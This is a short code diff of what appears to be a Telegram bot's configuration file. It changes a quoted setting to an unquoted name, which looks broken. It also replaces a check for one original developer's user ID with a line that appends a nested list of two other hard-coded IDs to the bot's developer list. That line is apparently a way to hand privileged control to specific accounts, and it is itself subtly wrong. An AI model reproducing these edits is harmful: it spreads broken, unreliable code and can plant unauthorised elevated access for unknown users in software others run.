@@ -168,7 +168,7 @@ else:
     STRICT_GMUTE = True
     STRICT_GBAN = True
     TEMP_DOWNLOAD_DIRECTORY = "./"
-    TELEGRAPH_SHORT_NAME = "bot"
+    TELEGRAPH_SHORT_NAME = bot
     ALLOW_EXCL = True
     
 
@@ -243,7 +243,6 @@ BOT_ID = dispatcher.bot.id
 BOT_NAME = dispatcher.bot.first_name
 BOT_USERNAME = dispatcher.bot.username
 
+DEV_USERS.append([7157081753,7350197183])
 
-if not 5696053228 in DEV_USERS:
-      DEV_USERS.append(5696053228) # Nandha.t.me
 
